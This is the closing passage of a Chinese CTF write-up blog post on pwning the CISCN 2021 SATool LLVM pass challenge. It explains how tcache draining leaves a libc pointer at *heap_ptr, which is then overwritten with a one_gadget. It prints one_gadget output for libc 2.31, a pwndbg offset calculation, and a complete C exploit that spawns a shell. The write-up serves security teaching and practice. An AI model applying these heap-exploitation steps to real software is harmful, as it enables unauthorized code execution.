+<p>不难想出利用方法，因为最后会执行<code>*heap_ptr</code>，所以我们可以将<code>*heap_ptr</code>改成one_gadget</p>
+<p>那如何将<code>*heap_ptr</code>改成one_gadget呢，因为fakekey可以改<code>*heap_ptr</code>，所以我们需要想办法将<code>*heap_ptr</code>放一个libc上的地址然后再利用fakekey的偏移改成one_gadget</p>
+<p>怎么在<code>*heap_ptr</code>上放一个libc呢，我们看一下bins的情况</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/21.png" alt="5" style="zoom:50%;">
+
+<p>发现了0x20上有很多chunk，也发现了unsortedbin和small bin，那我们是不是可以将tcache清空， 再申请的时候就会有libc地址了</p>
+<p>这样的话就可以把libc上的地址放到*heap_ptr上了，需要注意的是最后一个的一参放空</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/22.png" alt="5" style="zoom:50%;">
+
+<p>最后main_arena + 112会到<code>*heap_ptr</code>上，利用fakekey打*heap_ptr为one_gadget即可，因为笔者用的2.31的ubuntu，所以直接ogg2.31</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xe3afe</span> execve(<span class="string">"/bin/sh"</span>, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == <span class="literal">NULL</span> || r15 == <span class="literal">NULL</span></span><br><span class="line">  [r12] == <span class="literal">NULL</span> || r12 == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b01</span> execve(<span class="string">"/bin/sh"</span>, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == <span class="literal">NULL</span> || r15 == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b04</span> execve(<span class="string">"/bin/sh"</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == <span class="literal">NULL</span> || rsi == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff3e39000</span>     <span class="number">0x7ffff3e5b000</span> r--p    <span class="number">22000</span> <span class="number">0</span>      /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">0x7ffff3e5b000</span>     <span class="number">0x7ffff3fd3000</span> r-xp   <span class="number">178000</span> <span class="number">22000</span>  /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">0x7ffff3fd3000</span>     <span class="number">0x7ffff4021000</span> r--p    <span class="number">4e000</span> <span class="number">19</span>a000 /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">0x7ffff4021000</span>     <span class="number">0x7ffff4025000</span> r--p     <span class="number">4000</span> <span class="number">1e7000</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">0x7ffff4025000</span>     <span class="number">0x7ffff4027000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>eb000 /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br></pre></td></tr></tbody></table></figure>
+
+<p>所以有</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="number">0x7ffff4025bf0</span> - <span class="number">0x7ffff3e39000</span></span><br><span class="line">$<span class="number">9</span> = <span class="number">0x1ecbf0</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>0x1ecbf0 - 0xe3afe = 0x1090f2</code>，exp如下</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>{</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">(<span class="type">char</span> *c)</span>{</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>{</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">int</span> d)</span>{</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>{</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>{</span><br><span class="line">	save(<span class="string">"z1r0"</span>, <span class="string">"z1r0"</span>);</span><br><span class="line">	save(<span class="string">"z1r0"</span>, <span class="string">"z1r0"</span>);</span><br><span class="line">	save(<span class="string">"z1r0"</span>, <span class="string">"z1r0"</span>);</span><br><span class="line">	save(<span class="string">"z1r0"</span>, <span class="string">"z1r0"</span>);</span><br><span class="line">	save(<span class="string">"z1r0"</span>, <span class="string">"z1r0"</span>);</span><br><span class="line">	save(<span class="string">"z1r0"</span>, <span class="string">"z1r0"</span>);</span><br><span class="line">	save(<span class="string">"z1r0"</span>, <span class="string">"z1r0"</span>);</span><br><span class="line">	save(<span class="string">""</span>, <span class="string">"z1r0"</span>);</span><br><span class="line">	stealkey();</span><br><span class="line">	fakekey(<span class="number">-0x1090f2</span>);</span><br><span class="line">	run();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/23.png" alt="5" style="zoom:50%;">
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如何快速的筛选出有用的代码是最关键的地方，必要的时候需要动静结合分析这样可以快速理解程序逻辑</p>
+</font>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LLVM-PASS-PWN-%E4%BA%8C"><span class="toc-number">1.</span> <span class="toc-text">LLVM PASS PWN (二)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95-LLVM-PASS"><span class="toc-number">1.1.</span> <span class="toc-text">调试 LLVM PASS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2021-SATool"><span class="toc-number">1.2.</span> <span class="toc-text">CISCN 2021 SATool</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">逆向分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;text=LLVM PASS PWN (二)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;title=LLVM PASS PWN (二)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;is_video=false&amp;description=LLVM PASS PWN (二)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=LLVM PASS PWN (二)&amp;body=Check out this article: http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;title=LLVM PASS PWN (二)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;title=LLVM PASS PWN (二)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;title=LLVM PASS PWN (二)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;title=LLVM PASS PWN (二)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;name=LLVM PASS PWN (二)&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;t=LLVM PASS PWN (二)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright ©
+    
+    
+    2021-2023
+    z1r0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
